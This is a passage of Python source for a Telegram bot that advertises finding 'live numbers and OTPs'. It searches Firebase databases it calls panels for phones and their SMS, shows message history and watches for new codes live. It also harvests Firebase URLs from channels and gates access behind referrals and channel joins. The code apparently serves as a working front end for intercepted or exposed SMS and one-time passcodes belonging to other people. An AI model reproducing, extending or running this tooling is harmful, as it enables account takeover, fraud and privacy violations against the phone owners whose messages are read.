        if uid in rd.get("refs", []):
            return
        d["ref_by"] = rid
        save()
    if not force_check(uid):
        count_ref(u, rid)
    else:
        send(u["id"], f"{emo('🤝')} ʀᴇꜰᴇʀ ʟɪɴᴋ ᴀᴄᴄᴇᴘᴛᴇᴅ!\n{emo('📢')} ɴᴏᴡ ᴊᴏɪɴ ᴀʟʟ ᴄʜᴀɴɴᴇʟs ᴀɴᴅ ᴛᴀᴘ ᴠᴇʀɪꜰʏ —\nʏᴏᴜʀ ʀᴇꜰᴇʀ ᴄᴏᴜɴᴛs ᴏɴʟʏ ᴀꜰᴛᴇʀ ᴛʜᴀᴛ.")

def handle_start(u, cid, args=""):
    uid = str(u["id"])
    get_user(u["id"], u.get("username"), u.get("first_name"))
    if args.startswith("ref_"):
        register_ref(u, args[4:])
    if not force_ok(u["id"]):
        force_card(cid, u)
        return
    send_home_gated(cid, u)

def handle_text(u, cid, text):
    uid = str(u["id"])
    if text.startswith("/start"):
        parts = text.split(maxsplit=1)
        handle_start(u, cid, parts[1] if len(parts) > 1 else "")
        return
    get_user(u["id"], u.get("username"), u.get("first_name"))
    m = mode.pop(uid, None)
    if isinstance(m, tuple):
        if m[0] == "bcu_ready" and is_adm(uid):
            mode.pop(uid, None)
            r = send(int(m[1]), text)
            send(cid, f"{sec('✅', 'ʙᴄ sᴇɴᴛ')}\n{DIV}\n\n"
                      f"{emo('🆔')} ᴛᴏ <code>{m[1]}</code>: "
                      f"{'ᴅᴇʟɪᴠᴇʀᴇᴅ' if r and r.get('ok') else 'ꜰᴀɪʟᴇᴅ'}" + footer())
            return
        mode[uid] = m
        send(cid, f"{emo('👉')} ᴜsᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴀʙᴏᴠᴇ ᴛᴏ ᴄᴏɴꜰɪʀᴍ.")
        return
    if m == "search":
        a = re.sub(r"\D", "", text)
        if len(a) != 10 or a[0] not in "6789":
            send(cid, f"{emo('❌')} sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ 10-ᴅɪɢɪᴛ ɴᴜᴍʙᴇʀ.")
            mode[uid] = "search"
            return
        typing(cid)
        msg = send(cid, f"{sec('🔍', 'ꜱᴇᴀʀᴄʜɪɴɢ')}\n{DIV}\n\n"
                        f"{emo('🔍')} <code>{fmt_phone(a)}</code> — ꜱᴄᴀɴɴɪɴɢ ᴀʟʟ ᴘᴀɴᴇʟs...")
        mid = msg["result"]["message_id"] if msg and msg.get("ok") else None
        ensure_user_fbs(uid)
        idx = devices_index(uid)
        hits = [d for d in idx if d["phone"] == a]
        if not hits:
            refresh_pool(user_fbs(uid))
            idx = devices_index(uid)
            hits = [d for d in idx if d["phone"] == a]
        if not hits:
            txt = (f"{sec('👻', 'ɴᴏᴛ ꜰᴏᴜɴᴅ')}\n{DIV}\n\n"
                   f"{emo('🔍')} <code>{fmt_phone(a)}</code> ɴᴏᴛ ꜰᴏᴜɴᴅ ɪɴ ᴀɴʏ ᴘᴀɴᴇʟ." + footer())
            kb = buttons([[btn("sᴇᴀʀᴄʜ ᴀɢᴀɪɴ", "search", style="primary", icon=EID["search"])], [b_back()]])
            if mid: edit(cid, mid, txt, kb)
            else:   send(cid, txt, kb)
            return
        hits.sort(key=lambda d: (0 if d["online"] else 1, -learned_ts.get((d["url"], d["cid"]), 0)))
        d = hits[0]
        claim_device(uid, d)
        state.setdefault(uid, {})["dev"] = d
        txt, kb = dev_card(d, "ʏᴏᴜʀ ɴᴜᴍʙᴇʀ" if d["online"] else "ɴᴜᴍʙᴇʀ ꜰᴏᴜɴᴅ (ɪᴅʟᴇ)")
        if mid: edit(cid, mid, txt, kb)
        else:   send(cid, txt, kb)
        return
    if m == "addfb":
        url = text.strip().rstrip("/")
        if not FB_RE.match(url + "/"):
            send(cid, f"{emo('❌')} ᴛʜᴀᴛ's ɴᴏᴛ ᴀ ᴠᴀʟɪᴅ ꜰɪʀᴇʙᴀꜱᴇ ᴜʀʟ.\n"
                      f"ꜰᴏʀᴍᴀᴛ: <code>https://xxx-default-rtdb.firebaseio.com</code>")
            return
        typing(cid)
        wait = send(cid, f"{sec('⏳', 'ᴄʜᴇᴄᴋɪɴɢ ꜰɪʀᴇʙᴀꜱᴇ')}\n{DIV}\n\n{emo('🔗')} ᴘʀᴏʙɪɴɢ ᴘᴀɴᴇʟ...")
        clients, err = fetch_clients(url)
        d = get_user(u["id"])
        if not clients:
            if wait and wait.get("ok"):
                edit(cid, wait["result"]["message_id"],
                     f"{sec('❌', 'ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴛ ᴡᴏʀᴋɪɴɢ')}\n{DIV}\n\n"
                     f"{emo('🔗')} <code>{esc(url[:60])}</code>\n"
                     f"{emo('💀')} ʀᴇᴀꜱᴏɴ: <code>{esc(err or 'no data')}</code>" + footer(),
                     buttons([[b_back()]]))
            return
        with fb_lock:
            fb_cache[url] = {"clients": _slim_clients(clients), "t": time.time(), "ok": True}
        with _lock:
            fbs = d.setdefault("fbs", [])
            if url not in fbs:
                fbs.append(url)
            save()
        if wait and wait.get("ok"):
            edit(cid, wait["result"]["message_id"],
                 f"{sec('✅', 'ꜰɪʀᴇʙᴀꜱᴇ ᴀᴅᴅᴇᴅ!')}\n{DIV}\n\n"
                 f"{emo('🔗')} <code>{esc(url[:60])}</code>\n"
                 f"{emo('🔒')} ᴘʀɪᴠᴀᴛᴇ — ᴏɴʟʏ ʏᴏᴜ ᴄᴀɴ ᴜꜱᴇ ᴛʜɪs ᴘᴀɴᴇʟ." + footer(),
                 buttons([[btn("ꜰɪɴᴅ ɴᴜᴍʙᴇʀ", "getnum", style="success", icon=EID["phone"])], [b_back()]]))
        for oid in ADMIN_IDS:
            addfb_notify(oid, u["id"], d, url)
        return
    if m == "adm_addfb":
        found = [mm.group(0).rstrip("/") for mm in
                 re.finditer(r"https://[^\s<>\"']+\.(?:firebaseio\.com|firebasedatabase\.app)", text, re.IGNORECASE)]
        with fb_list_lock:
            have = set(GLOBAL_FB_LIST)
        seen, uniq = set(), []
        for u0 in found:
            if u0 not in seen and u0 not in have:
                seen.add(u0)
                uniq.append(u0)
        dup = len(found) - len(uniq)
        if not uniq:
            send(cid, f"{emo('❌')} ɴᴏ ɴᴇᴡ ᴠᴀʟɪᴅ ᴜʀʟs ꜰᴏᴜɴᴅ"
                      + (f" ({dup} ᴅᴜᴘʟɪᴄᴀᴛᴇ)." if dup else "."))
            mode[uid] = "adm_addfb"
            return
        wait = send(cid, f"{sec('⏳', 'ᴄʜᴇᴄᴋɪɴɢ')}\n{DIV}\n\n"
                         f"{emo('🔍')} ᴘʀᴏʙɪɴɢ <b>{len(uniq)}</b> ɴᴇᴡ ᴘᴀɴᴇʟs...")
        res = list(JOB_POOL.map(lambda x: (x, fetch_clients(x)[0]), uniq))
        added, dead = [], []
        with fb_list_lock:
            for x, cl in res:
                if isinstance(cl, dict) and cl:
                    GLOBAL_FB_LIST.append(x)
                    added.append(x)
                else:
                    dead.append(x)
        for x in added:
            refresh_fb(x)
        _save_fbs()
        if wait and wait.get("ok"):
            edit(cid, wait["result"]["message_id"],
                 f"{sec('✅', 'ᴀᴅᴅ ꜰʙ ʀᴇsᴜʟᴛ')}\n{DIV}\n\n"
                 f"{emo('✅')} ᴀᴅᴅᴇᴅ: <b>{len(added)}</b>"
                 + "".join(f"\n{emo('🔗')} <code>{esc(fb_short(x))}</code>" for x in added)
                 + (f"\n\n{emo('💀')} ꜱᴋɪᴘᴇᴅ (ᴅᴇᴀᴅ/ᴇᴍᴘᴛʏ): {len(dead)}" if dead else "")
                 + (f"\n{emo('🔄')} ᴅᴜᴘʟɪᴄᴀᴛᴇ: {dup}" if dup else "")
                 + f"\n\n{emo('📊')} ᴛᴏᴛᴀʟ ɢʟᴏʙᴀʟ ᴘᴀɴᴇʟs: <b>{len(GLOBAL_FB_LIST)}</b>" + footer(),
                 buttons([[b_back("adm")]]))
        return
    if m == "adm_video":
        t = text.strip().lower()
        if t in ("done", "ᴅᴏɴᴇ"):
            flush_video_queue(cid, uid)
        elif t in ("cancel", "ᴄᴀɴᴄᴇʟ"):
            st = state.get(uid) or {}
            n = len(st.get("vidq") or [])
            st["vidq"] = []
            mode.pop(uid, None)
            send(cid, f"{emo('🗑')} ǫᴜᴇᴜᴇ ᴄʟᴇᴀʀᴇᴅ — {n} ᴅʀᴏᴘᴘᴇᴅ.")
        else:
            mode[uid] = "adm_video"
            send(cid, f"{emo('📱')} ꜱᴇɴᴅ ᴠɪᴅᴇᴏ ꜰɪʟᴇs ɪɴ ᴄʜᴀᴛ, ᴏʀ ᴛʏᴘᴇ <code>ᴅᴏɴᴇ</code> / <code>ᴄᴀɴᴄᴇʟ</code>.")
        return
    if m == "adm_user":
        v = users.get(text.strip())
        if v:
            send(cid, f"{sec('👤', 'ᴜsᴇʀ ɪɴꜰᴏ')}\n{DIV}\n\n"
                      f"{emo('🆔')} <b>ɪᴅ:</b> <code>{esc(text.strip())}</code>\n"
                      f"{emo('👤')} <b>ɴᴀᴍᴇ:</b> {esc(v.get('n') or '—')}\n"
                      f"{emo('🔗')} <b>ᴜsᴇʀɴᴀᴍᴇ:</b> {'@' + esc(v['u']) if v.get('u') else '—'}\n"
                      f"{emo('🤝')} <b>ʀᴇꜰᴇʀs:</b> {len(v.get('refs', []))}\n"
                      f"{emo('📌')} <b>ᴘᴀɴᴇʟs:</b> {len(v.get('fbs', []))}\n"
                      f"{emo('🚫')} <b>ʙᴀɴɴᴇᴅ:</b> {'ʏᴇs' if v.get('banned') else 'ɴᴏ'}\n"
                      f"{emo('📅')} <b>ᴊᴏɪɴᴇᴅ:</b> {esc(v.get('j', '—'))}" + footer())
        else:
            send(cid, f"{emo('❌')} ᴜsᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ.")
        return
    if m == "adm_addadm":
        a = text.strip()
        if not a.isdigit():
            send(cid, f"{emo('❌')} ꜱᴇɴᴅ ᴀ ɴᴜᴍᴇʀɪᴄ <b>ᴜsᴇʀ ɪᴅ</b>.")
            mode[uid] = "adm_addadm"
            return
        if is_adm(a):
            send(cid, f"{emo('⚠️')} ᴛʜᴀᴛ ɪᴅ ɪs ᴀʟʀᴇᴀᴅʏ ᴀᴅᴍɪɴ.")
            return
        extra_admins.add(int(a))
        _save_adms()
        send(cid, f"{sec('✅', 'ᴀᴅᴍɪɴ ᴀᴅᴅᴇᴅ')}\n{DIV}\n\n"
                  f"{emo('🆔')} <code>{a}</code> ɪs ɴᴏᴡ ᴀɴ ᴀᴅᴍɪɴ." + footer())
        return
    if m == "adm_rmadm":
        a = text.strip()
        if not a.isdigit():
            send(cid, f"{emo('❌')} ꜱᴇɴᴅ ᴀ ɴᴜᴍᴇʀɪᴄ <b>ᴜsᴇʀ ɪᴅ</b>.")
            mode[uid] = "adm_rmadm"
            return
        if int(a) in ADMIN_IDS:
            send(cid, f"{emo('🚫')} ᴄᴀɴ'ᴛ ʀᴇᴍᴏᴠᴇ ᴏᴡɴᴇʀ.")
            return
        if int(a) not in extra_admins:
            send(cid, f"{emo('❌')} ᴛʜᴀᴛ ɪᴅ ɪs ɴᴏᴛ ᴀɴ ᴀᴅᴍɪɴ.")
            return
        extra_admins.discard(int(a))
        _save_adms()
        send(cid, f"{sec('✅', 'ᴀᴅᴍɪɴ ʀᴇᴍᴏᴠᴇᴅ')}\n{DIV}\n\n"
                  f"{emo('🆔')} <code>{a}</code> ɪs ɴᴏ ʟᴏɴɢᴇʀ ᴀᴅᴍɪɴ." + footer())
        return
    if m == "adm_ban":
        a = text.strip()
        v = users.get(a)
        if not v:
            send(cid, f"{emo('❌')} ᴜsᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ.")
            mode[uid] = "adm_ban"
            return
        if is_adm(a):
            send(cid, f"{emo('🚫')} ᴄᴀɴ'ᴛ ʙᴀɴ ᴀɴ ᴀᴅᴍɪɴ.")
            return
        v["banned"] = True
        save()
        send(cid, f"{sec('🚫', 'ᴜsᴇʀ ʙᴀɴɴᴇᴅ')}\n{DIV}\n\n"
                  f"{emo('🆔')} <code>{esc(a)}</code>\n"
                  f"{emo('👤')} {esc(v.get('n') or '—')}" + footer())
        return
    if m == "adm_unban":
        a = text.strip()
        v = users.get(a)
        if not v:
            send(cid, f"{emo('❌')} ᴜsᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ.")
            mode[uid] = "adm_unban"
            return
        v["banned"] = False
        save()
        send(cid, f"{sec('✅', 'ᴜsᴇʀ ᴜɴʙᴀɴɴᴇᴅ')}\n{DIV}\n\n"
                  f"{emo('🆔')} <code>{esc(a)}</code>\n"
                  f"{emo('👤')} {esc(v.get('n') or '—')}" + footer())
        return
    if m == "adm_bcu":
        a = text.strip()
        if not a.isdigit() or a not in users:
            send(cid, f"{emo('❌')} ᴜsᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ — ꜱᴇɴᴅ ᴀ ᴠᴀʟɪᴅ <b>ᴜsᴇʀ ɪᴅ</b>.")
            mode[uid] = "adm_bcu"
            return
        mode[uid] = ("bcu_ready", a)
        send(cid, f"{sec('📣', 'ʙᴄ ᴛᴀʀɢᴇᴛ ꜱᴇᴛ')}\n{DIV}\n\n"
                  f"{emo('🆔')} <code>{a}</code>\n"
                  f"{emo('💬')} ɴᴏᴡ ꜱᴇɴᴅ ᴛʜᴇ <b>ᴍᴇssᴀɢᴇ</b> ᴛᴏ ᴅᴇʟɪᴠᴇʀ:" + footer())
        return
    if m == "adm_bcast":
        send(cid, f"{sec('📣', 'ʙʀᴏᴀᴅᴄᴀsᴛ')}\n{DIV}\n\n"
                  f"{emo('👤', 'user')} ᴛᴀʀɢᴇᴛꜱ: <b>{len(users)}</b> ᴜsᴇʀs\n"
                  f"{emo('💬')} ꜱᴇɴᴅ ᴛʜɪs ᴍᴇssᴀɢᴇ ᴛᴏ ᴀʟʟ?", buttons([
            [btn("sᴇɴᴅ ɪᴛ", "bcast_go", style="success", icon=EID["ok"])],
            [btn("ᴄᴀɴᴄᴇʟ", "back", style="danger", icon=EID["warn"])]]))
        mode[uid] = ("bcast_ready", text)
        return
    send(cid, f"<blockquote>{emo('📱')} ꜰɪɴᴅ ʟɪᴠᴇ ɴᴜᴍʙᴇʀs ᴀɴᴅ ᴏᴛᴘs\n"
              f"{emo('👉')} ᴜsᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ.</blockquote>")

def handle_cb(u, cid, data, qid, mid=None):
    uid = str(u["id"])
    if data == "back":
        mode.pop(uid, None)
        stop_live(uid)
        send_home_gated(cid, u)
        answer_cb(qid)
        return
    if data == "verify":
        missing = [] if is_unlimited(uid) else force_check(uid)
        if not missing:
            with _fj_lock:
                _fj[uid] = (time.time(), True)
            d = get_user(u["id"])
            if d.get("ref_by"):
                threading.Thread(target=count_ref, args=(u, d["ref_by"]), daemon=True).start()
            send_home_gated(cid, u)
            answer_cb(qid, "ᴠᴇʀɪꜰɪᴇᴅ — ᴡᴇʟᴄᴏᴍᴇ!")
        else:
            answer_cb(qid, "ɴᴏᴛ ᴊᴏɪɴᴇᴅ ʏᴇᴛ: " + " + ".join(missing) + " — ᴊᴏɪɴ, ᴛʜᴇɴ ᴛᴀᴘ ᴠᴇʀɪꜰʏ.", alert=True)
        return
    if data == "refcheck":
        if unlocked(uid):
            send_home(cid, u["id"], u)
            answer_cb(qid, "ᴜɴʟᴏᴄᴋᴇᴅ — ᴇɴᴊᴏʏ!")
        else:
            d = get_user(u["id"])
            answer_cb(qid, f"sᴛɪʟʟ ɴᴇᴇᴅ {max(0, MIN_REFS - len(d.get('refs', [])))} ᴍᴏʀᴇ ʀᴇꜰᴇʀs", alert=True)
        return
    if not force_ok(uid):
        force_card(cid, u)
        answer_cb(qid)
        return
    if data in ("getnum", "dev_new"):
        answer_cb(qid)
        stop_live(uid)
        typing(cid)
        m = send(cid, f"{sec('⚡', 'ꜰᴇᴛᴄʜɪɴɢ')}\n{DIV}\n\n{emo('📣')} ɢʀᴀʙʙɪɴɢ ʟᴀᴛᴇsᴛ ᴏɴʟɪɴᴇ ɴᴜᴍʙᴇʀ...")
        if m and m.get("ok"):
            get_number(cid, uid, mid=m["result"]["message_id"])
    elif data == "search":
        answer_cb(qid)
        mode[uid] = "search"
        send(cid, f"{sec('🔍', 'ꜱᴇᴀʀᴄʜ ɴᴜᴍʙᴇʀ')}\n{DIV}\n\n"
                  f"{emo('📱')} sᴇɴᴅ ᴀ <b>10-ᴅɪɢɪᴛ ɴᴜᴍʙᴇʀ</b> ᴛᴏ ꜱᴇᴀʀᴄʜ:\n"
                  f"ᴇxᴀᴍᴘʟᴇ: <code>8825112393</code>")
    elif data == "act":
        answer_cb(qid)
        stop_live(uid)
        typing(cid)
        page_cache.pop(uid, None)
        m = send(cid, f"{sec('⚡', 'ʟᴏᴀᴅɪɴɢ')}\n{DIV}\n\n{emo('📣')} ꜰᴇᴛᴄʜɪɴɢ ᴅᴇᴠɪᴄᴇ ʟɪꜱᴛ...")
        if m and m.get("ok"):
            txt, kb = active_card(uid, 0)
            edit(cid, m["result"]["message_id"], txt, kb)
    elif data.startswith("num_"):
        answer_cb(qid)
        snap = page_cache.get(uid)
        try:
            i = int(data[4:])
        except ValueError:
            return
        if not snap or i >= len(snap["list"]):
            send(cid, f"{emo('❌')} ʟɪsᴛ ᴇxᴘɪʀᴇᴅ — ᴏᴘᴇɴ ᴀᴄᴛɪᴠᴇ ɴᴜᴍʙᴇʀs ᴀɢᴀɪɴ.",
                 buttons([[btn("ᴀᴄᴛɪᴠᴇ ɴᴜᴍʙᴇʀs", "act", style="primary", icon=EID["chart"])]]))
            return
        stop_live(uid)
        d = snap["list"][i]
        claim_device(uid, d)
        state.setdefault(uid, {})["dev"] = d
        txt, kb = dev_card(d, "ɴᴜᴍʙᴇʀ ᴅᴇᴛᴀɪʟs")
        send(cid, txt, kb)
    elif data == "dev_refresh":
        answer_cb(qid)
        d = (state.get(uid) or {}).get("dev")
        if d and mid:
            txt, kb = dev_card(d)
            edit(cid, mid, txt, kb)
    elif data == "dev_hist":
        answer_cb(qid)
        d = (state.get(uid) or {}).get("dev")
        if not d:
            return
        msgs = fetch_msgs(d["url"], d["cid"], 10)
        learn_ts(d["url"], d["cid"], msgs)
        body = "\n\n".join(sms_block(x[1], x[0]) for x in msgs) if msgs else "ɴᴏ ꜱᴍꜱ ʏᴇᴛ"
        send(cid, f"{sec('📄', 'sᴍs ʜɪsᴛᴏʀʏ — ' + fmt_phone(d['phone']))}\n{DIV}\n\n{body}" + footer(),
             buttons([[btn("ʀᴇꜰʀᴇsʜ", "dev_hist", style="primary", icon=EID["ok"]),
                       btn("ʟɪᴠᴇ", "dev_live", style="success", icon=EID["fire"])],
                      [b_back()]]))
    elif data == "dev_live":
        answer_cb(qid)
        stop_live(uid)
        threading.Thread(target=live_watcher, args=(cid, uid), daemon=True).start()
    elif data == "live_stop":
        answer_cb(qid, "ʟɪᴠᴇ sᴛᴏᴘᴘᴇᴅ")
        stop_live(uid)
    elif data == "lb":
        answer_cb(qid)
        txt, kb = lb_card(uid)
        send(cid, txt, kb)
    elif data == "refer":
        answer_cb(qid)
        txt, kb = refer_card(uid)
        send(cid, txt, kb)
    elif data == "addfb":
        answer_cb(qid)
        mode[uid] = "addfb"
        send(cid, f"{sec('➕', 'ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ')}\n{DIV}\n\n"
                  f"{emo('🔗')} sᴇɴᴅ ʏᴏᴜʀ ꜰɪʀᴇʙᴀꜱᴇ ᴜʀʟ:\n"
                  f"<code>https://xxx-default-rtdb.firebaseio.com</code>\n\n"
                  f"{emo('🔒')} ɪᴛ ᴡɪʟʟ ʙᴇ ᴘʀɪᴠᴀᴛᴇ — ᴏɴʟʏ ʏᴏᴜ ᴄᴀɴ ᴜꜱᴇ ɪᴛ.")
    elif data == "help":
        answer_cb(qid)
        help_card(cid)
    elif data == "adm":
        if is_adm(uid):
            answer_cb(qid)
            admin_menu(cid)
        else:
            answer_cb(qid)
    elif data == "adm_addfb":
        if not is_adm(uid):
            answer_cb(qid)
            return
        answer_cb(qid)
        mode[uid] = "adm_addfb"
        send(cid, f"{sec('➕', 'ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ (ɢʟᴏʙᴀʟ)')}\n{DIV}\n\n"
                  f"{emo('🔗')} ꜱᴇɴᴅ ᴏɴᴇ ᴏʀ ᴍᴏʀᴇ ᴜʀʟs — ᴏɴᴇ ᴘᴇʀ ʟɪɴᴇ:\n"
                  f"<code>https://xxx-default-rtdb.firebaseio.com</code>\n\n"
                  f"{emo('✅')} ᴏɴʟʏ ᴡᴏʀᴋɪɴɢ ᴘᴀɴᴇʟs ᴡɪʟʟ ʙᴇ ᴀᴅᴅᴇᴅ." + footer(),
             buttons([[b_back("back")]]))
    elif data == "adm_video":
        if not is_adm(uid):
            answer_cb(qid)
            return
        answer_cb(qid)
        mode[uid] = "adm_video"
        state.setdefault(uid, {})["vidq"] = []
        n = len(list(VIDEO_DIR.glob("*.mp4")))
        send(cid, f"{sec('📱', 'ᴀᴅᴅ/ʀᴇᴍᴏᴠᴇ ᴠɪᴅᴇᴏ')}\n{DIV}\n\n"
                  f"{emo('📱')} ᴄᴜʀʀᴇɴᴛ ᴠɪᴅᴇᴏs: <b>{n}</b>\n"
                  f"{emo('💬')} ꜱᴇɴᴅ ᴏɴᴇ ᴏʀ ᴍᴏʀᴇ <b>ᴠɪᴅᴇᴏ ꜰɪʟᴇs</b> ʜᴇʀᴇ ɪɴ ᴄʜᴀᴛ,\n"
                  f"ᴛʜᴇɴ ᴛʏᴘᴇ <code>ᴅᴏɴᴇ</code> — ᴀʟʟ ᴡɪʟʟ ᴜᴘʟᴏᴀᴅ ᴀᴛ ᴏɴᴄᴇ.\n"
                  f"ᴛᴏ ᴅᴇʟᴇᴛᴇ, ᴛᴀᴘ ʀᴇᴍᴏᴠᴇ." + footer(),
             buttons([[btn("ʀᴇᴍᴏᴠᴇ ᴠɪᴅᴇᴏ", "adm_vidlist", style="danger", icon=EID["trash"])],
                      [b_back("adm")]]))
    elif data == "adm_vidlist":
        if not is_adm(uid):
            answer_cb(qid)
            return
        answer_cb(qid)
        vids = sorted(VIDEO_DIR.glob("*.mp4"))
        if not vids:
            send(cid, f"{emo('👻')} ɴᴏ ᴠɪᴅᴇᴏs ɪɴ ꜰᴏʟᴅᴇʀ.", buttons([[b_back("adm")]]))
            return
        rows = [[btn(p.name[:22], f"adm_vdel_{i}", style="danger", icon=EID["trash"])]
                for i, p in enumerate(vids)]
        rows.append([b_back("adm_video")])
        send(cid, f"{sec('🗑', 'ʀᴇᴍᴏᴠᴇ ᴠɪᴅᴇᴏ')}\n{DIV}\n\n"
                  f"{emo('👉')} ᴛᴀᴘ ᴀ ᴠɪᴅᴇᴏ ᴛᴏ ᴅᴇʟᴇᴛᴇ ɪᴛ:" + footer(), buttons(rows))
    elif data.startswith("adm_vdel_"):
        if not is_adm(uid):
            answer_cb(qid)
            return
        try:
            i = int(data[9:])
        except ValueError:
            answer_cb(qid)
            return
        vids = sorted(VIDEO_DIR.glob("*.mp4"))
        if i >= len(vids):
            answer_cb(qid, "ʟɪsᴛ ᴄʜᴀɴɢᴇᴅ — ʀᴇᴏᴘᴇɴ ʀᴇᴍᴏᴠᴇ ᴠɪᴅᴇᴏ", alert=True)
            return
        p = vids[i]
        try:
            p.unlink()
        except Exception:
            pass
        with _vlock:
            _vids.pop(p.name, None)
        threading.Thread(target=_save_vids, daemon=True).start()
        answer_cb(qid, "ᴅᴇʟᴇᴛᴇᴅ")
        send(cid, f"{sec('🗑', 'ᴠɪᴅᴇᴏ ʀᴇᴍᴏᴠᴇᴅ')}\n{DIV}\n\n"
                  f"{emo('📱')} <code>{esc(p.name[:30])}</code>\n"
                  f"{emo('🎉')} ʟᴇꜰᴛ: <b>{len(list(VIDEO_DIR.glob('*.mp4')))}</b> ᴠɪᴅᴇᴏs ɪɴ ʀᴏᴛᴀᴛɪᴏɴ." + footer())
    elif data == "adm_fbs":
        answer_cb(qid)
        with fb_list_lock:
            lst = list(GLOBAL_FB_LIST)
        with fb_lock:
            okset = {u for u, v in fb_cache.items() if v["ok"]}
        lines = [f"{emo('🟢') if u in okset else emo('🔴')} {i + 1}. <code>{esc(fb_short(u))}</code>"
                 for i, u in enumerate(lst)]
        send(cid, f"{sec('🔗', f'ɢʟᴏʙᴀʟ ᴘᴀɴᴇʟs ({len(lst)})')}\n{DIV}\n\n" + "\n".join(lines),
             buttons([[b_back("adm")]]))
    elif data.startswith("adm_") or data == "bcast_go":
        if not is_adm(uid):
            answer_cb(qid)
            return
        if data == "bcast_go":
            st = mode.pop(uid, None)
            if st and isinstance(st, tuple) and st[0] == "bcast_ready":
                text = st[1]
                with _lock:
                    targets = [int(k) for k, v in users.items() if not v.get("banned")]
                okc = 0
                for t in targets:
                    if send(t, text):
                        okc += 1
                    time.sleep(0.05)
                send(cid, f"{sec('✅', 'ʙʀᴏᴀᴅᴄᴀsᴛ ᴅᴏɴᴇ')}\n{DIV}\n\n"
                          f"{emo('📣')} ᴅᴇʟɪᴠᴇʀᴇᴅ ᴛᴏ <b>{okc}</b> / {len(targets)} ᴜsᴇʀs." + footer())
            else:
                answer_cb(qid)
            return
        prompts = {
            "adm_bcast": f"{sec('📣', 'ʙʀᴏᴀᴅᴄᴀsᴛ')}\n{DIV}\n\n"
                         f"{emo('💬')} ꜱᴇɴᴅ ᴛʜᴇ <b>ᴍᴇssᴀɢᴇ</b> ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ:",
            "adm_bcu": f"{sec('📣', 'ʙᴄ ᴛᴏ ᴜsᴇʀ')}\n{DIV}\n\n"
                       f"{emo('🆔')} ꜱᴇɴᴅ ᴛʜᴇ <b>ᴜsᴇʀ ɪᴅ</b> ᴛᴏ ᴅᴇʟɪᴠᴇʀ ᴛᴏ:",
            "adm_addadm": f"{sec('➕', 'ᴀᴅᴅ ᴀᴅᴍɪɴ')}\n{DIV}\n\n"
                          f"{emo('🆔')} ꜱᴇɴᴅ ᴛʜᴇ <b>ᴜsᴇʀ ɪᴅ</b> ᴛᴏ ᴍᴀᴋᴇ ᴀᴅᴍɪɴ:",
            "adm_rmadm": f"{sec('🗑', 'ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴ')}\n{DIV}\n\n"
                         f"{emo('🆔')} ꜱᴇɴᴅ ᴛʜᴇ <b>ᴀᴅᴍɪɴ ɪᴅ</b> ᴛᴏ ʀᴇᴍᴏᴠᴇ:",
            "adm_ban": f"{sec('🚫', 'ʙᴀɴ ᴜsᴇʀ')}\n{DIV}\n\n"
                       f"{emo('🆔')} ꜱᴇɴᴅ ᴛʜᴇ <b>ᴜsᴇʀ ɪᴅ</b> ᴛᴏ ʙᴀɴ:",
            "adm_unban": f"{sec('✅', 'ᴜɴʙᴀɴ ᴜsᴇʀ')}\n{DIV}\n\n"
                         f"{emo('🆔')} ꜱᴇɴᴅ ᴛʜᴇ <b>ᴜsᴇʀ ɪᴅ</b> ᴛᴏ ᴜɴʙᴀɴ:",
            "adm_user": f"{sec('👤', 'ᴜsᴇʀ ɪɴꜰᴏ')}\n{DIV}\n\n"
                        f"{emo('🆔')} ꜱᴇɴᴅ ᴛʜᴇ <b>ᴜsᴇʀ ɪᴅ</b>:",
        }
        if data not in prompts:
            answer_cb(qid)
            return
        mode[uid] = data
        answer_cb(qid)
        send(cid, prompts[data] + f"\n\n{emo('🔙')} ᴄᴀɴᴄᴇʟ ʙʏ ᴛᴀᴘᴘɪɴɢ ʙᴀᴄᴋ ᴏɴ ʜᴏᴍᴇ.",
             buttons([[b_back("back")]]))
    else:
        answer_cb(qid)

# ── long polling ──
OFFS = None

def get_updates():
    global OFFS
    try:
        r = sess.get(f"{TG}/getUpdates", params={"offset": OFFS, "timeout": 50,
                                                 "allowed_updates": '["message","callback_query","channel_post"]'},
                     timeout=70)
        return r.json().get("result", [])
    except Exception:
        return []

def process(upd):
    try:
        if "channel_post" in upd:
            post = upd["channel_post"]
            cidp = (post.get("chat") or {}).get("id")
            if cidp in HARVEST_CHANS:
                harvest_text((post.get("text") or "") + "\n" + (post.get("caption") or ""))
            return
        if "callback_query" in upd:
            q = upd["callback_query"]
            u = q.get("from") or {}
            msg = q.get("message") or {}
            cid, mid = msg.get("chat", {}).get("id"), msg.get("message_id")
            data = q.get("data", "")
            if not cid or not u:
                return
            uid = str(u["id"])
            if users.get(uid, {}).get("banned"):
                answer_cb(q["id"])
                return
            if data != "verify" and not is_adm(u["id"]) and not force_ok(u["id"]):
                force_card(cid, u)
                answer_cb(q["id"])
                return
            if data not in ("verify", "refcheck") and not is_adm(u["id"]) and not unlocked(u["id"]):
                reflock_card(cid, u)
                answer_cb(q["id"])
                return
            if data == "act_refresh":
                answer_cb(q["id"])
                page_cache.pop(uid, None)
                txt, kb = active_card(uid, 0)
                if mid:
                    edit(cid, mid, txt, kb)
            elif data.startswith("act_"):
                answer_cb(q["id"])
                try:
                    page = int(data[4:])
                except ValueError:
                    page = 0
                txt, kb = active_card(uid, page)
                if mid:
                    edit(cid, mid, txt, kb)
            elif data == "noop":
                answer_cb(q["id"])
            else:
                handle_cb(u, cid, data, q["id"], mid=mid)
        elif "message" in upd:
            msg = upd["message"]
            u = msg.get("from") or {}
            if not u or u.get("is_bot"):
                return
            cid = msg["chat"]["id"]
            uid = str(u["id"])
            if users.get(uid, {}).get("banned"):
                return
            fo = msg.get("forward_origin") or {}
            fchat = None
            if fo.get("type") == "channel":
                fchat = (fo.get("chat") or {}).get("id")
            elif msg.get("forward_from_chat"):
                fchat = msg["forward_from_chat"].get("id")
